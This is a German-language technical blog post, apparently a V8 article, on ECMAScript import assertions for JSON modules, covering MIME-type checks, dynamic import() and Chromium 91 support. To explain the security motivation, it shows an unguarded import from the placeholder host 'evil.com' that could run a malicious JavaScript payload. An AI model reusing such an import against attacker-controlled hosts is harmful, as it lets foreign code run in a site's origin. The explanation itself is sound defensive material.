---
title: "Importbedingungen"
author: "Dan Clark ([@dandclark1](https://twitter.com/dandclark1)), entschlossener Importeur von Importbedingungen"
avatars: 
  - "dan-clark"
date: 2021-06-15
tags: 
  - ECMAScript
description: "Importbedingungen ermöglichen es, dass Modulimportanweisungen zusätzliche Informationen neben dem Modulspezifizierer enthalten"
tweet: ""
---

Die neue Funktion [Importbedingungen](https://github.com/tc39/proposal-import-assertions) ermöglicht es, dass Modulimportanweisungen zusätzliche Informationen neben dem Modulspezifizierer enthalten. Eine erste Anwendung dieser Funktion besteht darin, JSON-Dokumente als [JSON-Module](https://github.com/tc39/proposal-json-modules) zu importieren:

<!--truncate-->
```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
import json from './foo.json' assert { type: 'json' };
console.log(json.answer); // 42
```

## Hintergrund: JSON-Module und MIME-Typ

Eine natürliche Frage wäre, warum ein JSON-Modul nicht einfach wie folgt importiert werden könnte:

```javascript
import json from './foo.json';
```

Die Webplattform überprüft den MIME-Typ einer Modulressource auf Gültigkeit, bevor sie ausgeführt wird, und theoretisch könnte dieser MIME-Typ auch verwendet werden, um zu bestimmen, ob die Ressource als JSON- oder als JavaScript-Modul behandelt werden soll.

Es gibt jedoch ein [Sicherheitsproblem](https://github.com/w3c/webcomponents/issues/839) beim Verlassen auf den MIME-Typ allein.

Module können plattformübergreifend importiert werden, und ein Entwickler könnte ein JSON-Modul von einer Drittanbieterquelle importieren. Sie könnten dies als grundsätzlich sicher betrachten, selbst von einem nicht vertrauenswürdigen Drittanbieter, solange das JSON ordnungsgemäß bereinigt wird, da der Import von JSON kein Skript ausführt.

Allerdings kann ein bösartiges Drittanbieterskript in diesem Szenario tatsächlich ausgeführt werden, da der Drittanbieterserver unerwartet mit einem JavaScript-MIME-Typ und einer schädlichen JavaScript-Nutzlast antworten könnte, wodurch im Domain-Bereich des Importeurs Code ausgeführt wird.

```javascript
// Führt JS aus, wenn evil.com mit einem
// JavaScript-MIME-Typ antwortet (z. B. `text/javascript`)!
import data from 'https://evil.com/data.json';
```

Dateiendungen können nicht verwendet werden, um die Bestimmung des Modultyps zu treffen, da sie [kein verlässlicher Indikator für den Inhaltstyp im Web sind](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md). Stattdessen verwenden wir Importbedingungen, um den erwarteten Modultyp anzugeben und diesen Privilegieneskalationsfehler zu verhindern.

Wenn ein Entwickler ein JSON-Modul importieren möchte, muss er eine Importbedingung verwenden, um anzugeben, dass es sich um JSON handelt. Der Import schlägt fehl, wenn der über das Netzwerk empfangene MIME-Typ nicht dem erwarteten Typ entspricht:

```javascript
// Schlägt fehl, wenn evil.com eine Antwort mit einem Nicht-JSON-MIME-Typ gibt.
import data from 'https://evil.com/data.json' assert { type: 'json' };
```

## Dynamischer `import()`

Importbedingungen können auch an [dynamische `import()`](https://v8.dev/features/dynamic-import#dynamic) mit einem neuen zweiten Parameter übergeben werden:

```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
const jsonModule = await import('./foo.json', {
  assert: { type: 'json' }
});
console.log(jsonModule.default.answer); // 42
```

Der JSON-Inhalt ist der Standardexport des Moduls, daher wird er über die `default`-Eigenschaft des von `import()` zurückgegebenen Objekts referenziert.

## Fazit

Derzeit ist die einzige festgelegte Verwendung von Importbedingungen die Spezifikation des Modultyps. Die Funktion wurde jedoch so konzipiert, dass sie beliebige Schlüssel/Wert-Paare für Bedingungen zulässt, sodass zusätzliche Verwendungen in Zukunft hinzugefügt werden können, wenn es sich als nützlich erweist, Modulimporte auf andere Weise einzuschränken.

Währenddessen sind JSON-Module mit der neuen Syntax für Importbedingungen standardmäßig in Chromium 91 verfügbar. Auch [CSS-Modulscripte](https://chromestatus.com/feature/5948572598009856) sind bald verfügbar, die dieselbe Syntax für Modultyp-Bedingungen verwenden.

## Unterstützung für Importbedingungen

<feature-support chrome="91 https://chromestatus.com/feature/5765269513306112"
                 firefox="nein"
                 safari="nein"
                 nodejs="nein"
                 babel="ja https://github.com/babel/babel/pull/12139"></feature-support>
